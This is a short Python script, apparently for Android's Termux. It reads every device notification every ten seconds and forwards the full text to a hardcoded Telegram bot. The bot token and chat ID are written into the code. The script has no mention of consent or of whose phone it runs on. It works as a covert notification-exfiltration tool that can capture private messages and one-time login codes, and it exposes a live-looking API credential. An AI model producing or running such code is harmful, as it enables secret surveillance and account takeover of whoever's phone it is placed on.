import subprocess
import time
import requests

TELEGRAM_API_URL = "https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk/sendMessage"
CHAT_ID = "5928551879"

def send_telegram_message(message):
    params = {
        'chat_id': CHAT_ID,
        'text': message
    }
    response = requests.get(TELEGRAM_API_URL, params=params)
    return response.json()

def get_notifications():
    try:
        # Capture notifications using termux-notification-list
        notifications = subprocess.check_output("termux-notification-list", shell=True, stderr=subprocess.PIPE)
        notifications = notifications.decode('utf-8').strip()
        return notifications
    except Exception as e:
        print(f"Error fetching notifications: {e}")
        return None

def main():
    while True:
        notifications = get_notifications()
        if notifications:
            # Send notifications to Telegram
            send_telegram_message(f"Notifications:\n\n{notifications}")
        time.sleep(10)  # Capture notifications every 10 seconds

if __name__ == "__main__":
    main()
